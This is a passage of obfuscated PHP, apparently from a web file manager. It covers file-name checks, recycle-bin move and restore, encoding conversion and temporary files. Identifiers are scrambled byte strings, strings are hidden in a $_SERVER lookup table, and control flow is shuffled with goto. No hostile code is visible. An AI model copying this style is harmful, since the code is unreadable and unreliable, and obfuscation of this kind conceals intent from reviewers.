$aØğƒä”‘¡[$A²ÈÏÖÔß˜[28]], $A²ÈÏÖÔß˜[2017] => $this->where($díÚ®Ù§ÒŒ)->count(), $A²ÈÏÖÔß˜[574] => $this->where($díÚ®Ù§ÒŒ)->sum($A²ÈÏÖÔß˜[78])); } Cache::set($BÕÃÇ¸¼ˆï, $FŠêƒâõ˜‘, 1200); return $FŠêƒâõ˜‘; goto E¡ÎÅ¼ÓÜ÷; FêàßŠ¬¨â: $FŠêƒâõ˜‘ = array(); $FŠêƒâõ˜‘[$A²ÈÏÖÔß˜[2015]] = array($A²ÈÏÖÔß˜[2016] => LNG($A²ÈÏÖÔß˜[2015]), $A²ÈÏÖÔß˜[2017] => $this->where($díÚ®Ù§ÒŒ)->count(), $A²ÈÏÖÔß˜[574] => $this->where($díÚ®Ù§ÒŒ)->sum($A²ÈÏÖÔß˜[78])); $b¡Ê¿™Á¶ = KodIO::fileTypeList(); goto aÔŠ”×Õ‡; FÄøï«ôÛ: $A²ÈÏÖÔß˜ =& $_SERVER[›èö’ù¤]; $BÕÃÇ¸¼ˆï = $A²ÈÏÖÔß˜[2014] . $c¸•ƒÌî¸ . $A²ÈÏÖÔß˜[71] . $CÒ¤×Ğñíğ; $EÔˆ»Ïµğ = Cache::get($BÕÃÇ¸¼ˆï); goto C”™ƒ—‹…; E¡ÎÅ¼ÓÜ÷: } public function fileNameExist($eâË¦öÌÓ, $fµ×­Ï¾ÕÖ) { $eŸâ¡³Ã =& $_SERVER[›èö’ù¤]; $F„µƒİŸã = $this->where(array($eŸâ¡³Ã[493] => $eâË¦öÌÓ, $eŸâ¡³Ã[28] => $fµ×­Ï¾ÕÖ, $eŸâ¡³Ã[425] => 0))->find(); return is_array($F„µƒİŸã) ? $F„µƒİŸã[$eŸâ¡³Ã[397]] : !1; } public function childList($DñÄ…²°»´) { goto D®Ò›œ‰Â’; a§àÖ†±™×: self::$cacheChildList[$F ÖçñˆĞ] = $e²À–¯¸““; foreach ($e²À–¯¸““ as $fš½¸Ú†‹‰) { $F ÖçñˆĞ = $d±æÈŠŠÄ«[453] . $fš½¸Ú†‹‰[$d±æÈŠŠÄ«[397]]; self::$cacheSourceInfo[$F ÖçñˆĞ] = $fš½¸Ú†‹‰; } return $e²À–¯¸““; goto eœù“Ì‹„ê; D®Ò›œ‰Â’: $d±æÈŠŠÄ« =& $_SERVER[›èö’ù¤]; $F ÖçñˆĞ = $d±æÈŠŠÄ«[1992] . $DñÄ…²°»´; if (isset(self::$cacheChildList[$F ÖçñˆĞ])) { return self::$cacheChildList[$F ÖçñˆĞ]; } goto AÎÓš‡¹à; AÎÓš‡¹à: $bµ¦Ä“ã·µ = array($d±æÈŠŠÄ«[493] => intval($DñÄ…²°»´), $d±æÈŠŠÄ«[425] => 0); $e²À–¯¸““ = $this->where($bµ¦Ä“ã·µ)->select(); $e²À–¯¸““ = $e²À–¯¸““ ? $e²À–¯¸““ : array(); goto a§àÖ†±™×; eœù“Ì‹„ê: } public function fileNameAuto($F•— ‰ ÷Š, $C¥·îƒ…Œ, $cÌÚ‹İåÅÍ = REPEAT_RENAME, $b°¯¨©±‡ù = false) { $Eµ©Ô×ØÙÛ =& $_SERVER[›èö’ù¤]; $bµÙÍä¨¡¬ = array($Eµ©Ô×ØÙÛ[493] => $F•— ‰ ÷Š, $Eµ©Ô×ØÙÛ[425] => 0, $Eµ©Ô×ØÙÛ[28] => array($Eµ©Ô×ØÙÛ[381], $C¥·îƒ…Œ . $Eµ©Ô×ØÙÛ[382])); $aÎ¬Ë¾çÅÓ = $this->field($Eµ©Ô×ØÙÛ[28])->where($bµÙÍä¨¡¬)->select(); $e¥ÄùŒ”œƒ = array_to_keyvalue($aÎ¬Ë¾çÅÓ, $Eµ©Ô×ØÙÛ[33], $Eµ©Ô×ØÙÛ[28]); return $this->fileNameAutoGet($e¥ÄùŒ”œƒ, $C¥·îƒ…Œ, $cÌÚ‹İåÅÍ, $b°¯¨©±‡ù); } public function fileNameAutoGet($AèÅ¿çö, $dÃ…º‰¤ë, $c¶è³Ì‹İ, $E¢š¨ö‚Å£) { $bƒÛëê™º =& $_SERVER[›èö’ù¤]; if ($c¶è³Ì‹İ == REPEAT_REPLACE || !$AèÅ¿çö || !in_array_not_case($dÃ…º‰¤ë, $AèÅ¿çö) || $E¢š¨ö‚Å£ && $c¶è³Ì‹İ != REPEAT_RENAME_FOLDER) { return $dÃ…º‰¤ë; } if ($c¶è³Ì‹İ == REPEAT_SKIP) { return !1; } $EÇ§ãº¸¦Š = $bƒÛëê™º[95] . get_path_ext($dÃ…º‰¤ë); $EÇ§ãº¸¦Š = $EÇ§ãº¸¦Š == $bƒÛëê™º[95] || $E¢š¨ö‚Å£ ? $bƒÛëê™º[33] : $EÇ§ãº¸¦Š; for ($a©äÊ‚ŒœÒ = 1; $a©äÊ‚ŒœÒ <= count($AèÅ¿çö) + 1; $a©äÊ‚ŒœÒ++) { $eã¸ÛÅ½¾Ä = substr($dÃ…º‰¤ë, 0, strlen($dÃ…º‰¤ë) - strlen($EÇ§ãº¸¦Š)); $DÁÈİ‹ï¬” = $eã¸ÛÅ½¾Ä . "\x28{$a©äÊ‚ŒœÒ}\51{$EÇ§ãº¸¦Š}"; if (!in_array_not_case($DÁÈİ‹ï¬”, $AèÅ¿çö)) { return $DÁÈİ‹ï¬”; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\143\x65\x5f\x72\x65\143\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\164\151\x6f\x6e")); public function listData($f»×ƒ±Ï— = false) { $EµÁ’¬›•³ =& $_SERVER[›èö’ù¤]; $f»×ƒ±Ï— = $f»×ƒ±Ï— ? $f»×ƒ±Ï— : USER_ID; $AŠéå¤„‚ = $this->where(array($EµÁ’¬›•³[1542] => $f»×ƒ±Ï—))->select(); return array_to_keyvalue($AŠéå¤„‚, $EµÁ’¬›•³[33], $EµÁ’¬›•³[397]); } public function moveToRecycle($aê™‡éâÊƒ) { goto EÛ›º¨ÚÊÑ; EŸ–ŞŸ¨éù: $this->recycleMove($aê™‡éâÊƒ, 1); if ($B»­İÈ¢ö·[$EìÁ×’¦Ü¹[405]] == $EìÁ×’¦Ü¹[87]) { $a«¯–°éğÂ = array($EìÁ×’¦Ü¹[579] => array($EìÁ×’¦Ü¹[539], $B»­İÈ¢ö·[$EìÁ×’¦Ü¹[516]] . $aê™‡éâÊƒ . $EìÁ×’¦Ü¹[540])); $b«¥è‰ŸÄ->where($a«¯–°éğÂ)->setField($EìÁ×’¦Ü¹[425], 1); } goto A¨—’–ƒğ; EÛ›º¨ÚÊÑ: $EìÁ×’¦Ü¹ =& $_SERVER[›èö’ù¤]; $b«¥è‰ŸÄ = Model($EìÁ×’¦Ü¹[1230]); $B»­İÈ¢ö· = $b«¥è‰ŸÄ->sourceInfo($aê™‡éâÊƒ); goto dÇ‹¡‰‚¥; dÇ‹¡‰‚¥: if (!$B»­İÈ¢ö· || $B»­İÈ¢ö·[$EìÁ×’¦Ü¹[425]] == $EìÁ×’¦Ü¹[87]) { return; } $FŠ…Á¨Â‘ = array($EìÁ×’¦Ü¹[412] => $aê™‡éâÊƒ, $EìÁ×’¦Ü¹[1542] => USER_ID, $EìÁ×’¦Ü¹[575] => $B»­İÈ¢ö·[$EìÁ×’¦Ü¹[406]], $EìÁ×’¦Ü¹[576] => $B»­İÈ¢ö·[$EìÁ×’¦Ü¹[499]], $EìÁ×’¦Ü¹[579] => $B»­İÈ¢ö·[$EìÁ×’¦Ü¹[516]]); $this->add($FŠ…Á¨Â‘); goto EŸ–ŞŸ¨éù; A¨—’–ƒğ: } public function clear() { $this->remove(!1); } public function remove($a¶‹Ï§ğó = false, $BÚóÃæÔ¸ï = false) { goto f¡Ï¥ÏäİÕ; fÁêÖç²Ïä: foreach ($CªÅ©ì‹ùŞ as $EÉ“ˆŞö‘æ) { if ($a¶‹Ï§ğó != !1 && !in_array($EÉ“ˆŞö‘æ, $a¶‹Ï§ğó)) { continue; } $f¥£ŞäêÒé = $e•¿Ü–••ó->sourceInfo($EÉ“ˆŞö‘æ); $e•¿Ü–••ó->remove($EÉ“ˆŞö‘æ, !1); $b†”„ŠÖĞö = $f¥£ŞäêÒé[$eöÊî¨÷÷”[406]] . $eöÊî¨÷÷”[71] . $f¥£ŞäêÒé[$eöÊî¨÷÷”[499]]; $a½ì…Î÷èç[$b†”„ŠÖĞö] = array($eöÊî¨÷÷”[575] => $f¥£ŞäêÒé[$eöÊî¨÷÷”[406]], $eöÊî¨÷÷”[499] => $f¥£ŞäêÒé[$eöÊî¨÷÷”[499]]); $this->where(array($eöÊî¨÷÷”[397] => $EÉ“ˆŞö‘æ))->delete(); } foreach ($a½ì…Î÷èç as $e‡œÖŒÆê¾) { $e•¿Ü–••ó->targetSpaceUpdate($e‡œÖŒÆê¾[$eöÊî¨÷÷”[406]], $e‡œÖŒÆê¾[$eöÊî¨÷÷”[499]]); } goto C¬ÄˆÜÍ„; f°ä´Š„½ò: $CªÅ©ì‹ùŞ = $this->listData($BÚóÃæÔ¸ï); $a¶‹Ï§ğó = $a¶‹Ï§ğó === !1 ? !1 : $a¶‹Ï§ğó; $a½ì…Î÷èç = array(); goto fÁêÖç²Ïä; f¡Ï¥ÏäİÕ: $eöÊî¨÷÷” =& $_SERVER[›èö’ù¤]; $BÚóÃæÔ¸ï = $BÚóÃæÔ¸ï ? $BÚóÃæÔ¸ï : USER_ID; $e•¿Ü–••ó = Model($eöÊî¨÷÷”[1230]); goto f°ä´Š„½ò; C¬ÄˆÜÍ„: } public function restore($F°ŠßºÌÀÒ = false) { $Bê…ï™ŸÏ = $this->listData(); $this->_restoreSource($Bê…ï™ŸÏ, $F°ŠßºÌÀÒ); } public function removeUserAll($BÒ¾‡æÌŠ) { $this->remove(!1, $BÒ¾‡æÌŠ); } private function _restoreSource($dŞ¼·šº°, $CÜº••ˆÅƒ) { goto E˜Õ×¥›»; f„Äô¦­¥: $dÙÈ³Å¿¶Õ->updateModifyTime($f‚ÖáŒ’³); goto B™«Ö±ËƒÏ; E˜Õ×¥›»: $a½¡®àµ– =& $_SERVER[›èö’ù¤]; $dÙÈ³Å¿¶Õ = Model($a½¡®àµ–[1230]); $CÜº••ˆÅƒ = $CÜº••ˆÅƒ == !1 ? !1 : $CÜº••ˆÅƒ; goto b†Éšª‹•; b†Éšª‹•: if (!$dŞ¼·šº°) { return !0; } $f‚ÖáŒ’³ = array(); foreach ($dŞ¼·šº° as $e•ºéÒ‰¤Ò) { goto fÉƒ°‹Şè; fÉƒ°‹Şè: if ($CÜº••ˆÅƒ != !1 && !in_array($e•ºéÒ‰¤Ò, $CÜº••ˆÅƒ)) { continue; } $FÓ²ãËò  = $dÙÈ³Å¿¶Õ->sourceInfo($e•ºéÒ‰¤Ò); $d”Õ——‘„î = $dÙÈ³Å¿¶Õ->sourceInfo($FÓ²ãËò [$a½¡®àµ–[493]]); goto d“Õù¢Œğ¼; d“Õù¢Œğ¼: if ($d”Õ——‘„î[$a½¡®àµ–[425]] == $a½¡®àµ–[87]) { continue; } $dÙÈ³Å¿¶Õ->lockMoveStart($e•ºéÒ‰¤Ò); $this->recycleMove($e•ºéÒ‰¤Ò, 0); goto a¿óí¿¨£œ; fš§„‡¥éÄ: $f‚ÖáŒ’³[] = $FÓ²ãËò [$a½¡®àµ–[493]]; if ($FÓ²ãËò [$a½¡®àµ–[405]] == $a½¡®àµ–[87]) { $f‚ÖáŒ’³[] = $e•ºéÒ‰¤Ò; } $dÙÈ³Å¿¶Õ->lockMoveEnd($e•ºéÒ‰¤Ò); goto cÑÔ¼º¢Î¾; a¿óí¿¨£œ: if ($FÓ²ãËò [$a½¡®àµ–[405]] == $a½¡®àµ–[87]) { $E¢Â–¿©¢ = array($a½¡®àµ–[579] => array($a½¡®àµ–[539], $FÓ²ãËò [$a½¡®àµ–[516]] . $e•ºéÒ‰¤Ò . $a½¡®àµ–[540])); $dÙÈ³Å¿¶Õ->where($E¢Â–¿©¢)->setField($a½¡®àµ–[425], 0); $this->restoreFolderChildren($e•ºéÒ‰¤Ò, $dŞ¼·šº°); } $this->where(array($a½¡®àµ–[397] => $e•ºéÒ‰¤Ò))->delete(); $dÙÈ³Å¿¶Õ->folderSizeReset($FÓ²ãËò [$a½¡®àµ–[493]]); goto fš§„‡¥éÄ; cÑÔ¼º¢Î¾: } goto f„Äô¦­¥; B™«Ö±ËƒÏ: } private function restoreFolderChildren($aÙíƒ±µ½º, $e†áÅ†šŒ) { goto D‹¿±Ä•Á£; D‹¿±Ä•Á£: $d¦Ó ®ŸÅÖ =& $_SERVER[›èö’ù¤]; $e¶ ”‰Ğëî = Model($d¦Ó ®ŸÅÖ[1230]); $dçíÃàÕ°ù = array($d¦Ó ®ŸÅÖ[397] => array($d¦Ó ®ŸÅÖ[7], array())); goto eƒì¼˜¼ï‚; eƒì¼˜¼ï‚: foreach ($e†áÅ†šŒ as $bÜßÉ›‹Á) { if ($bÜßÉ›‹Á == $aÙíƒ±µ½º) { continue; } if (!$e¶ ”‰Ğëî->isParentOf($aÙíƒ±µ½º, $bÜßÉ›‹Á)) { continue; } $aÀØ˜Ü¹Ã = $e¶ ”‰Ğëî->sourceInfo($bÜßÉ›‹Á); if ($aÀØ˜Ü¹Ã[$d¦Ó ®ŸÅÖ[405]] == $d¦Ó ®ŸÅÖ[87]) { $dçíÃàÕ°ù[] = array($d¦Ó ®ŸÅÖ[579] => array($d¦Ó ®ŸÅÖ[539], $aÀØ˜Ü¹Ã[$d¦Ó ®ŸÅÖ[516]] . $bÜßÉ›‹Á . $d¦Ó ®ŸÅÖ[540])); } else { $dçíÃàÕ°ù[$d¦Ó ®ŸÅÖ[397]][1][] = $bÜßÉ›‹Á; } } if (!$dçíÃàÕ°ù[$d¦Ó ®ŸÅÖ[397]][1]) { unset($dçíÃàÕ°ù[$d¦Ó ®ŸÅÖ[397]]); } if (!$dçíÃàÕ°ù) { return; } goto Fñ±èÃÃ‚; Fñ±èÃÃ‚: $dçíÃàÕ°ù[$d¦Ó ®ŸÅÖ[397]][1] = array_unique($dçíÃàÕ°ù[$d¦Ó ®ŸÅÖ[397]][1]); $dçíÃàÕ°ù[$d¦Ó ®ŸÅÖ[983]] = $d¦Ó ®ŸÅÖ[1812]; $e¶ ”‰Ğëî->where($dçíÃàÕ°ù)->setField($d¦Ó ®ŸÅÖ[425], 1); goto A’–Ççõ¿ß; A’–Ççõ¿ß: } private function recycleMove($fç‡æÓ¼ÉŒ, $B›Ú¤ì‰‘ß = 1) { $d’²¤ßÔì£ =& $_SERVER[›èö’ù¤]; $f©‚Í›”Ğ = Model($d’²¤ßÔì£[1230]); $a®—Ñ£¿Ñ¨ = Model($d’²¤ßÔì£[2018]); $dÜø¹¨ñô = array($d’²¤ßÔì£[397] => $fç‡æÓ¼ÉŒ); if ($B›Ú¤ì‰‘ß) { $f©‚Í›”Ğ->where($dÜø¹¨ñô)->setField($d’²¤ßÔì£[425], 1); $a®—Ñ£¿Ñ¨->eventRecycle($fç‡æÓ¼ÉŒ, $d’²¤ßÔì£[2019]); } else { $f¾‚æîÏ = $f©‚Í›”Ğ->where($dÜø¹¨ñô)->find(); $B¿’º§µÕ = $f¾‚æîÏ[$d’²¤ßÔì£[405]] == $d’²¤ßÔì£[87]; $E«®ƒÍª = $f©‚Í›”Ğ->fileNameAuto($f¾‚æîÏ[$d’²¤ßÔì£[493]], $f¾‚æîÏ[$d’²¤ßÔì£[28]], REPEAT_RENAME_FOLDER, $B¿’º§µÕ); if ($E«®ƒÍª != $f¾‚æîÏ[$d’²¤ßÔì£[28]]) { $f©‚Í›”Ğ->rename($fç‡æÓ¼ÉŒ, $E«®ƒÍª); } $f©‚Í›”Ğ->where($dÜø¹¨ñô)->setField($d’²¤ßÔì£[425], 0); $a®—Ñ£¿Ñ¨->eventRecycle($fç‡æÓ¼ÉŒ, $d’²¤ßÔì£[2020]); } } } goto B‚–ê…ãéÂ; Dö–Œô’õ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $aË¼àõÚ’ =& $_SERVER[›èö’ù¤]; $this->objectDriver = array($aË¼àõÚ’[57], $aË¼àõÚ’[58], $aË¼àõÚ’[59], $aË¼àõÚ’[60], $aË¼àõÚ’[61], $aË¼àõÚ’[62], $aË¼àõÚ’[63], $aË¼àõÚ’[64], $aË¼àõÚ’[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bËÍãÉêµ¼) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bËÍãÉêµ¼, $_SERVER[›èö’ù¤][8]); } return $bËÍãÉêµ¼; } public function iconvApp($aìÇ—ääè) { return $aìÇ—ääè; } public function iconvSystem($bØ²ˆˆÓ¹ö) { return $bØ²ˆˆÓ¹ö; } public function iconvTo($A†ƒŒÓÛƒ±, $b²¿‹‰é÷¸, $eÆÁ¥–á›ø) { goto cì©²¤¤éÛ; F“ƒß‚éçÔ: $eƒ­Ùåî¨ = $b²¿‹‰é÷¸ . $A‡°°ÎÍŠ©[67] . $eÆÁ¥–á›ø . $A‡°°ÎÍŠ©[68] . $A†ƒŒÓÛƒ±; if (isset($b×ÛÔº‚Š[$eƒ­Ùåî¨])) { return $b×ÛÔº‚Š[$eƒ­Ùåî¨]; } if (function_exists($A‡°°ÎÍŠ©[69])) { $DÙĞĞã¡† = @mb_convert_encoding($A†ƒŒÓÛƒ±, $eÆÁ¥–á›ø, $b²¿‹‰é÷¸); } else { $DÙĞĞã¡† = @iconv($b²¿‹‰é÷¸, $eÆÁ¥–á›ø, $A†ƒŒÓÛƒ±); } goto dùÅù¬Öó³; dÜêºÃÚÙ›: $b×ÛÔº‚Š[$eÆÁ¥–á›ø . $A‡°°ÎÍŠ©[67] . $b²¿‹‰é÷¸ . $A‡°°ÎÍŠ©[68] . $A†ƒŒÓÛƒ±] = $A†ƒŒÓÛƒ±; $b×ÛÔº‚Š[$eÆÁ¥–á›ø . $A‡°°ÎÍŠ©[67] . $b²¿‹‰é÷¸ . $A‡°°ÎÍŠ©[68] . $DÙĞĞã¡†] = $A†ƒŒÓÛƒ±; $b×ÛÔº‚Š[$b²¿‹‰é÷¸ . $A‡°°ÎÍŠ©[67] . $eÆÁ¥–á›ø . $A‡°°ÎÍŠ©[68] . $DÙĞĞã¡†] = $DÙĞĞã¡†; goto B„Äå‡ «; B„Äå‡ «: return $DÙĞĞã¡†; goto DŸÇ¸ö¿ŒÍ; dùÅù¬Öó³: $DÙĞĞã¡† = $DÙĞĞã¡† ? $DÙĞĞã¡† : $A†ƒŒÓÛƒ±; if (strstr($DÙĞĞã¡†, $A‡°°ÎÍŠ©[70])) { $DÙĞĞã¡† = str_replace($A‡°°ÎÍŠ©[70], $A‡°°ÎÍŠ©[71], $DÙĞĞã¡†); } $b×ÛÔº‚Š[$b²¿‹‰é÷¸ . $A‡°°ÎÍŠ©[67] . $eÆÁ¥–á›ø . $A‡°°ÎÍŠ©[68] . $A†ƒŒÓÛƒ±] = $DÙĞĞã¡†; goto dÜêºÃÚÙ›; cì©²¤¤éÛ: $A‡°°ÎÍŠ© =& $_SERVER[›èö’ù¤]; if (!$A†ƒŒÓÛƒ± || !function_exists($A‡°°ÎÍŠ©[66])) { return $A†ƒŒÓÛƒ±; } static $b×ÛÔº‚Š = array(); goto F“ƒß‚éçÔ; DŸÇ¸ö¿ŒÍ: } public function getPathInner($FÊŠ¯ë³ÛØ) { $A°Å„Ô‰ = IO::init($FÊŠ¯ë³ÛØ); return $A°Å„Ô‰->path; } public function getPathOuter($E•²œË±œ‘) { $Dù¨ óç =& $_SERVER[›èö’ù¤]; $fÚéÖ¡ÈÀá = strlen(trim($this->pathBase, $Dù¨ óç[8])); $E•²œË±œ‘ = substr(trim($E•²œË±œ‘, $Dù¨ óç[8]), $fÚéÖ¡ÈÀá); return $this->pathDriver . $Dù¨ óç[8] . ltrim($E•²œË±œ‘, $Dù¨ óç[8]); } public function isParentOf($fòÖ¡Ç¬È‹, $A¡ø‰ºÄ…ó) { $EÍº±áÅÊ =& $_SERVER[›èö’ù¤]; $fòÖ¡Ç¬È‹ = rtrim(strtolower($fòÖ¡Ç¬È‹), $EÍº±áÅÊ[8]) . $EÍº±áÅÊ[8]; $A¡ø‰ºÄ…ó = rtrim(strtolower($A¡ø‰ºÄ…ó), $EÍº±áÅÊ[8]) . $EÍº±áÅÊ[8]; $fß¥Ö¡®™¶ = strpos($A¡ø‰ºÄ…ó, $fòÖ¡Ç¬È‹) === 0; return $fß¥Ö¡®™¶; } public function getType() { $DÄ»Ùí½ˆ =& $_SERVER[›èö’ù¤]; $A¢öï–øÑœ = str_replace($DÄ»Ùí½ˆ[72], $DÄ»Ùí½ˆ[33], get_class($this)); return strtolower($A¢öï–øÑœ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FÙôØÎ©ŠÜ, $aƒï¯çë¡Ç) { $f®ŒèÎø¥ =& $_SERVER[›èö’ù¤]; $eğÜ¿„†¤œ = rtrim($FÙôØÎ©ŠÜ, $f®ŒèÎø¥[8]) . $f®ŒèÎø¥[8] . $aƒï¯çë¡Ç; $bšÍĞî»‡• = $this->exist($eğÜ¿„†¤œ); return $bšÍĞî»‡• ? $eğÜ¿„†¤œ : !1; } public function setModifyTime($Eƒ—ÌÖ„İÅ, $c½ÑŠÕ²°Ğ = '') { } public function renameObject($DÜäÚ÷µÎ, $Bæğèí·æ) { goto e×¯ÀõšÇÖ; eå…„«Ïö: $DÜäÚ÷µÎ = $this->getPathOuter($DÜäÚ÷µÎ); $Bæğèí·æ = $this->pathFather($DÜäÚ÷µÎ) . $Bæğèí·æ; if (IO::isFile($DÜäÚ÷µÎ)) { $C©øŠ¥ìÍµ = IO::copy($DÜäÚ÷µÎ, $this->pathFather($DÜäÚ÷µÎ), REPEAT_RENAME_FOLDER, $E³ÂÄ†®É); if ($C©øŠ¥ìÍµ) { IO::remove($DÜäÚ÷µÎ); } } else { $C©øŠ¥ìÍµ = IO::mkdir($Bæğèí·æ); if (!$C©øŠ¥ìÍµ) { return !1; } $c£¾ˆ‚Ù«Í = IO::listPath($DÜäÚ÷µÎ, !0); $e¼È†ÃòÓ“ = array_merge($c£¾ˆ‚Ù«Í[$aÉó‚ê÷ù[74]], $c£¾ˆ‚Ù«Í[$aÉó‚ê÷ù[75]]); foreach ($e¼È†ÃòÓ“ as $fëÔÖŠÂÀÓ) { IO::move($fëÔÖŠÂÀÓ[$aÉó‚ê÷ù[76]], $Bæğèí·æ, REPEAT_RENAME_FOLDER); } IO::remove($DÜäÚ÷µÎ); } goto EœÛ¾Ş±ª­; e×¯ÀõšÇÖ: $aÉó‚ê÷ù =& $_SERVER[›èö’ù¤]; $E³ÂÄ†®É = $Bæğèí·æ; Hook::trigger($aÉó‚ê÷ù[73], $this, $DÜäÚ÷µÎ, $this, $this->pathFather($DÜäÚ÷µÎ) . $Bæğèí·æ); goto eå…„«Ïö; EœÛ¾Ş±ª­: return $C©øŠ¥ìÍµ ? $Bæğèí·æ : !1; goto CÎŸøĞÇ•; CÎŸøĞÇ•: } public function tempFile($E§Ùá×±ó = '', $EÖ‘Ÿõ–æ‚ = '') { goto aÅÆœîÕ§Ã; dÂš¢‡Ö³×: $C…­™ˆä„È = $f‘öñªö‚ì . $E§Ùá×±ó; @touch($C…­™ˆä„È); if ($EÖ‘Ÿõ–æ‚) { file_put_contents($C…­™ˆä„È, $EÖ‘Ÿõ–æ‚); } goto dÊ•ºİßí™; aÅÆœîÕ§Ã: if (!$E§Ùá×±ó) { $E§Ùá×±ó = rand_string(15); } $f‘öñªö‚ì = TEMP_FILES . rand_string(15) . $_SERVER[›èö’ù¤][8]; @mkdir($f‘öñªö‚ì, DEFAULT_PERRMISSIONS, !0); goto dÂš¢‡Ö³×; dÊ•ºİßí™: return $C…­™ˆä„È; goto c„è†¶™›; c„è†¶™›: } public function tempFileRemve($d–ƒ¼ğºùÍ) { @unlink($d–ƒ¼ğºùÍ); @rmdir($this->pathFather($d–ƒ¼ğºùÍ)); } public function mkfile($B·Ì‡»ÁØí, $cˆâğ›„Çè = '', $fò˜ßô°À“ = REPEAT_RENAME) { } public function mkdir($BÖ™²Ë½«”, $bÓ”‚õÀ‹ˆ = REPEAT_SKIP) { } public function delFile($C†¸¼Ş’‰õ) { } public function delFolder($f´’šâ­‚ä) { } public function copyFile($d§ª²ÕÑ² , $d¿“¤ĞõÂÚ) { } public function moveFile($D¶‡¸ùƒ‹¿, $A¤ĞŞèö±) { } public function remove($DÅÆöµ¶Ú) { if ($this->isFile($DÅÆöµ¶Ú)) { return $this->delFile($DÅÆöµ¶Ú); } return $this->delFolder($DÅÆöµ¶Ú); } public function rename($f•êíÄ†°ñ, $A‰ ˜¶õé) { } public function exist($BÚÛíÈ§ƒ«) { } public function findByHash($FÏ‰İÏõãĞ = '', $F™ÙŠäïÑ¢ = '') { return !1; } public function isFile($CĞÂƒ±ˆ¸Ô) { } public function isFolder($BË½ˆÕ¥Ë½) { } public function size($Eåæâİº‘‡) { } public function info($cÒµÒ…²É¡) { } public function infoSimple($Bµ’½–ò÷Ô) { return $this->info($Bµ’½–ò÷Ô); } public function infoAuth($EéÈÍ×Ùæ) { return $this->info($EéÈÍ×Ùæ); } public function infoFull($a †Œ­”ãø) { return $this->info($a †Œ­”ãø); } public function infoWithChildren($aßœ…¡™¤›) { $e¢…íŞ½š =& $_SERVER[›èö’ù¤]; static $C£Ş«ìŠ§ñ = array(); if (isset($C£Ş«ìŠ§ñ[$aßœ…¡™¤›])) { return $C£Ş«ìŠ§ñ[$aßœ…¡™¤›]; } $A—„·ÈÙ—‘ = $this->info($aßœ…¡™¤›); if ($A—„·ÈÙ—‘ && $A—„·ÈÙ—‘[$e¢…íŞ½š[29]] == $e¢…íŞ½š[77]) { $FÀŠË°ßä¿ = array($e¢…íŞ½š[78] => 0, $e¢…íŞ½š[79] => 0, $e¢…íŞ½š[80] => 0); $this->infoChildren($aßœ…¡™¤›, $FÀŠË°ßä¿); $A—„·ÈÙ—‘[$e¢…íŞ½š[78]] = $FÀŠË°ßä¿[$e¢…íŞ½š[78]]; $A—„·ÈÙ—‘[$e¢…íŞ½š[81]] = array($e¢…íŞ½š[82] => $FÀŠË°ßä¿[$e¢…íŞ½š[79]], $e¢…íŞ½š[83] => $FÀŠË°ßä¿[$e¢…íŞ½š[80]]); $C£Ş«ìŠ§ñ[$aßœ…¡™¤›] = $A—„·ÈÙ—‘; } return $A—„·ÈÙ—‘; } public function listPath($A¸Ğ«·îñ¾, $A‡ÎùÃ‡Èš = false) { } public function has($Aˆß›·´í¶, $d´ÏÂ­œÂ = false, $Cõœ¤Èªí = false) { } public function canRead($f¥™ÓãŞƒë) { } public function canWrite($a…áôÖà) { } public function getContent($fšÆ²ÆØøĞ) { } public function setContent($DÚ†óÁ¢‡é, $A’õÒ£¦‰ = '') { } protected function infoChildren($E°îÌÑˆ§ˆ, &$aÒÆ½áëŞ¹) { $c¾Î¦» =& $_SERVER[›èö’ù¤]; check_abort_echo(); $EĞˆŞ°á”Ÿ = $this->listPath($E°îÌÑˆ§ˆ, !0); $EĞˆŞ°á”Ÿ = array_merge($EĞˆŞ°á”Ÿ[$c¾Î¦»[75]], $EĞˆŞ°á”Ÿ[$c¾Î¦»[74]]); foreach ($EĞˆŞ°á”Ÿ as $e£È¥Ğó¨—) { if ($e£È¥Ğó¨—[$c¾Î¦»[29]] == $c¾Î¦»[77]) { $aÒÆ½áëŞ¹[$c¾Î¦»[80]]++; $f¿ù¢íÌĞÀ = $this->getPathInner($e£È¥Ğó¨—[$c¾Î¦»[76]]); $this->infoChildren($f¿ù¢íÌĞÀ, $aÒÆ½áëŞ¹); } else { $aÒÆ½áëŞ¹[$c¾Î¦»[79]]++; $aÒÆ½áëŞ¹[$c¾Î¦»[78]] += $e£È¥Ğó¨—[$c¾Î¦»[78]]; } } } public function fileSubstr($c£ª¾¥éé“, $f‡—…‘Šñõ, $E„Œ£Í—£ë) { } public function listAll($aôÊ›°‘Ö…) { } public function listAllMake($fË¸¢šŒç†, &$cæì³†ŠÜˆ) { $E÷’Áğ—­Û =& $_SERVER[›èö’ù¤]; check_abort_echo(); $EØšµ„™Ã· = $this->listPath($fË¸¢šŒç†, !0); if (!$EØšµ„™Ã·) { return; } $eå¢è¨†Ä = array_merge($EØšµ„™Ã·[$E÷’Áğ—­Û[75]], $EØšµ„™Ã·[$E÷’Áğ—­Û[74]]); foreach ($eå¢è¨†Ä as $C¦â‘ğ“­§) { goto Bµ‡î¢†¥è; cÈ¢ğÅ©†: $this->listAllMake($C¦â‘ğ“­§[$E÷’Áğ—­Û[76]], $cæì³†ŠÜˆ); goto c‡­›È¤´; Bµ‡î¢†¥è: $d°•â¸òé = $C¦â‘ğ“­§[$E÷’Áğ—­Û[29]] == $E÷’Áğ—­Û[77]; $e³‡à÷ğøç = array($E÷’Áğ—­Û[76] => $C¦â‘ğ“­§[$E÷’Áğ—­Û[76]], $E÷’Áğ—­Û[77] => $d°•â¸òé); if (isset($C¦â‘ğ“­§[$E÷’Áğ—­Û[78]])) { $e³‡à÷ğøç[$E÷’Áğ—­Û[78]] = $C¦â‘ğ“­§[$E÷’Áğ—­Û[78]]; } goto Aí¦ã¦½ò; Aí¦ã¦½ò: if (isset($C¦â‘ğ“­§[$E÷’Áğ—­Û[84]])) { $e³‡à÷ğøç[$E÷’Áğ—­Û[84]] = 